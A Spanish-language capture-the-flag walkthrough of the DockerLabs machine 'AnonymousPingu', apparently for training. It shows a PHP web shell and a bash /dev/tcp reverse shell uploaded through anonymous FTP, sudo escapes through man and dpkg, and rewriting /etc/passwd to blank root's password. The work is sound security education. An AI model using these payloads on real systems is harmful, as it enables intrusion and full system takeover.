## Introducción

Este documento presenta la resolución completa de la máquina **AnonymousPingu**, desarrollada por *El Pingüino de Mario* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
El laboratorio expone un servicio FTP con acceso anónimo habilitado que comparte directorio con el servidor web, permitiendo la subida de archivos maliciosos. Al cargar una reverse shell en formato PHP, se obtiene ejecución remota de comandos como el usuario `www-data`.
Tras el acceso inicial, se encadenan múltiples configuraciones inseguras de `sudo` que permiten la ejecución de binarios como otros usuarios sin autenticación adicional, facilitando una escalada de privilegios progresiva: desde `www-data` hasta `pingu`, luego a `gladys` y finalmente a `root`.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip AnonymousPingu.zip
sudo bash auto_deploy.sh AnonymousPingu.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1761717544/Ip_kdnyha.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p AnonymousPingu/{content,exploits,nmap,scripts}
cd AnonymousPingu
```

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **21/tcp** — FTP
* **80/tcp** — HTTP

![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1762146403/Ports_ejeegl.png)

---

### 1.2 Enumeración de servicios

Se realiza un escaneo detallado de los servicios identificados:

```bash
nmap -sCV -p21,80 172.17.0.2 -oN targeted
```

---

### 1.3 Enumeración web

Se realiza un escaneo de directorios para encontrar posibles endpoints en el servicio del puerto 80:

```bash
gobuster dir -u http://172.17.0.2/ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
  -x php,html,txt,js -t 200
```

![Gobuster](https://res.cloudinary.com/dewqswzke/image/upload/v1762146402/Gobuster_h1klcq.png)

Rutas relevantes:
- `/index.php` — Página principal
  ![Index](https://res.cloudinary.com/dewqswzke/image/upload/v1762146403/Index_scayxk.png)
- `/upload` — Carpeta pública con permisos de lectura

---

### 1.4 Enumeración FTP

Se realiza un escaneo específico del servicio FTP:

```bash
nmap -p21 -sCV 172.17.0.2
```

![Scan result](https://res.cloudinary.com/dewqswzke/image/upload/v1762146404/Service21_g6etvp.png)

El resultado muestra:
- **FTP con acceso anónimo habilitado**
- Capacidad de **listar y subir archivos**
- Directorio compartido con `/upload` del servidor web

Este es un fallo crítico: permite **ejecutar código remoto** si el servidor web interpreta archivos `.php`.

## Paso 2 — Explotación (Acceso inicial)

### 2.1 Subida de Reverse Shell

Se crea un archivo malicioso `revShell.php`:

```php
<?php system($_GET['cmd']); ?>
```

O se utiliza una reverse shell más completa:

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'"); ?>
```

Se accede al FTP:

```bash
ftp 172.17.0.2
```

Dentro del servicio, se navega a `/upload` y se sube el archivo:

```bash
put revShell.php
```

![Content of /upload](https://res.cloudinary.com/dewqswzke/image/upload/v1762146407/Upload_yyb806.png)

Antes de ejecutarlo, se prepara el listener:

```bash
nc -nlvp 443
```

Finalmente, se accede desde el navegador:

```
http://172.17.0.2/upload/revShell.php
```

¡Reversa recibida!

![Reverse shell](https://res.cloudinary.com/dewqswzke/image/upload/v1762146408/Www-data_bokch0.png)

## Paso 3 — Escalada de privilegios

### 3.1 De www-data → pingu

Se verifican los permisos sudo:

```bash
sudo -l
```

![www-data sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1762146405/Sudo-lMan_bpcbre.png)

El usuario `www-data` puede ejecutar `man` como `pingu` sin contraseña.

Esto permite escapar a shell:

```bash
sudo -u pingu man man
!/bin/bash
```

Acceso obtenido:

![Pingu bash](https://res.cloudinary.com/dewqswzke/image/upload/v1762146403/PinguMan_hpunnj.png)

---

### 3.2 De pingu → gladys

Se verifican nuevamente los permisos sudo:

```bash
sudo -l
```

![Pingu sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1762146406/Sudo-lPingu_alkkzw.png)

El usuario `pingu` puede ejecutar `dpkg` como `gladys` sin contraseña.

Se ejecuta dpkg y se escapa a shell:

```bash
sudo -u gladys dpkg -l
!/bin/bash
```

Acceso obtenido:

![Gladys bash](https://res.cloudinary.com/dewqswzke/image/upload/v1762146402/GladysDpkg_anykpw.png)

---

### 3.3 De gladys → root

Se verifican los permisos sudo del usuario gladys:

```bash
sudo -l
```

![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1762146406/Sudo-lSudo_aw4mie.png)

`chown` puede ejecutarse como root sin contraseña. Esto permite manipular **/etc/passwd** y asignar una contraseña vacía a root.

Pasos:

```bash
sudo /usr/bin/chown $(id -un):$(id -gn) /etc/passwd
sed 's/^root:[^:]*:/root::/' /etc/passwd > /tmp/passwd.tmp
cp /tmp/passwd.tmp /etc/passwd
```

Luego:

```bash
su root
```

Acceso root:

![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1762146404/Root_sa3uom.png)
